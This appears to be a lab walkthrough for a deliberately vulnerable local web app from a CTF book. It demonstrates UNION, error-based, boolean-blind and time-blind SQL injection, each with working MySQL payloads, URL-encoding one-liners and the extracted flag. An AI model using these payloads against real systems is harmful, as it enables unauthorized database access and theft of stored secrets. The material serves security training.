
ref : https://github.com/ctfbook/2nd/tree/main/dist/files/web/05_SQLi/SQLi-app


## 0. Preparation

```bash
$ sudo docker-compose down && sudo docker-compose build --no-cache && sudo docker-compose up -d
```

- wait for db is ready

```bash
$ sudo docker logs mysql_mysql_db_1 | tail
...
2022-01-26T20:17:00.236870Z 15 [System] [MY-013172] [Server] Received SHUTDOWN from user root. Shutting down mysqld (Version: 8.0.28).
2022-01-26T20:17:30.471351Z 0 [System] [MY-010910] [Server] /usr/sbin/mysqld: Shutdown complete (mysqld 8.0.28)  MySQL Community Server - GPL.
2022-01-26T20:17:31.499144Z 0 [System] [MY-010116] [Server] /usr/sbin/mysqld (mysqld 8.0.28) starting as process 1
2022-01-26T20:17:31.522725Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
2022-01-26T20:17:33.460523Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
2022-01-26T20:17:34.390663Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.
2022-01-26T20:17:34.390720Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.
2022-01-26T20:17:34.445918Z 0 [Warning] [MY-011810] [Server] Insecure configuration for --pid-file: Location '/var/run/mysqld' in the path is accessible to all OS users. Consider choosing a different directory.
2022-01-26T20:17:34.503307Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: '::' port: 33060, socket: /var/run/mysqld/mysqlx.sock
2022-01-26T20:17:34.503413Z 0 [System] [MY-010931] [Server] /usr/sbin/mysqld: ready for connections. Version: '8.0.28'  socket: '/var/run/mysqld/mysqld.sock'  port: 3306  MySQL Community Server - GPL.


2022-01-26 20:16:59+00:00 [Note] [Entrypoint]: /usr/local/bin/docker-entrypoint.sh: running /docker-entrypoint-initdb.d/02_dml.sql


2022-01-26 20:17:00+00:00 [Note] [Entrypoint]: Stopping temporary server
2022-01-26 20:17:31+00:00 [Note] [Entrypoint]: Temporary server stopped

2022-01-26 20:17:31+00:00 [Note] [Entrypoint]: MySQL init process done. Ready for start up.
```

- web api server health check

```bash
$ curl http://localhost:8000
{"Hello":"World"}
```

## 1. UNION

- normal query

```bash
$ curl http://localhost:8000/search_vul_union?key=ke | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    28  100    28    0     0  28000      0 --:--:-- --:--:-- --:--:-- 28000
{
  "data": [
    [
      "key1",
      "value1"
    ]
  ]
}
```

- encode vulnerable key

```bash
$ echo "' union select 1, data from secrets;#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"
%27%20union%20select%201%2C%20data%20from%20secrets%3B%23%0A
```

- query with encoded vulnerable key

```bash
$ curl http://localhost:8000/search_vul_union?key=%27+union+select+1%2C+data+from+secrets%3B%23 | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    58  100    58    0     0  29000      0 --:--:-- --:--:-- --:--:-- 29000
{
  "data": [
    [
      "key1",
      "value1"
    ],
    [
      "1",
      "flag{can_you_get_me?}"
    ]
  ]
}
```

## 2. Error message

- normal query

```bash
$ curl http://localhost:8000/search_vul_error?key=ke | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    21  100    21    0     0    700      0 --:--:-- --:--:-- --:--:--   700
{
  "status": "not used"
}
```

- encode vulnerable key

```bash
$ echo "'||extractvalue(null,concat(0x01,(select data from secrets)));#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().replace('\n', '')))"
%27%7C%7Cextractvalue%28null%2Cconcat%280x01%2C%28select%20data%20from%20secrets%29%29%29%3B%23
```

- query with encoded vulnerable key

```bash
$ curl http://localhost:8000/search_vul_error?key=%27%7C%7Cextractvalue%28null%2Cconcat%280x01%2C%28select%20data%20from%20secrets%29%29%29%3B%23
{"detail":"db error : (1105, \"XPATH syntax error: '\\x01flag{can_you_get_me?}'\")"}
```

## 3. Boolean

- encode vulnerable key

```bash
$ echo "notusedkey' or 1=if((select ascii(substr(data, 1, 1)) from secrets)=65, 1, 0);#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().replace('\n', '')))"
notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D65%2C%201%2C%200%29%3B%23

$ echo "notusedkey' or 1=if((select ascii(substr(data, 1, 1)) from secrets)=102, 1, 0);#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().replace('\n', '')))"
notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D102%2C%201%2C%200%29%3B%23
```

- query with encoded vulnerable key

```bash
caharacter A
$ curl http://localhost:8000/search_vul_boolean?key=notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D65%2C%201%2C%200%29%3B%23
{"status":"not used"}

caharacter f
$ curl http://localhost:8000/search_vul_boolean?key=notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D102%2C%201%2C%200%29%3B%23
{"status":"used"}
```

## 4. Time

- encode vulnerable key

```bash
1st caharacter A
$ echo "notusedkey' or 1=if((select ascii(substr(data, 1, 1)) from secrets)=65, sleep(3), 0);#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().replace('\n', '')))"
notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D65%2C%20sleep%283%29%2C%200%29%3B%23

1st caharacter f
$ echo "notusedkey' or 1=if((select ascii(substr(data, 1, 1)) from secrets)=102, sleep(3), 0);#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().replace('\n', '')))"
notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D102%2C%20sleep%283%29%2C%200%29%3B%23

2nd caharacter l
$ echo "notusedkey' or 1=if((select ascii(substr(data, 2, 1)) from secrets)=108, sleep(3), 0);#" | python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().replace('\n', '')))"
notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%202%2C%201%29%29%20from%20secrets%29%3D108%2C%20sleep%283%29%2C%200%29%3B%23
```

- query with encoded vulnerable key

```bash
$ time curl http://localhost:8000/search_vul_boolean?key=notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D65%2C%20sleep%283%29%2C%200%29%3B%23
{"status":"not used"}
real    0m0.012s
user    0m0.008s
sys     0m0.004s

$ time curl http://localhost:8000/search_vul_boolean?key=notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%201%2C%201%29%29%20from%20secrets%29%3D102%2C%20sleep%283%29%2C%200%29%3B%23
{"status":"not used"}
real    0m3.029s
user    0m0.021s
sys     0m0.005s

$ time curl http://localhost:8000/search_vul_boolean?key=notusedkey%27%20or%201%3Dif%28%28select%20ascii%28substr%28data%2C%202%2C%201%29%29%20from%20secrets%29%3D108%2C%20sleep%283%29%2C%200%29%3B%23
{"status":"not used"}
real    0m3.145s
user    0m0.014s
sys     0m0.014s
```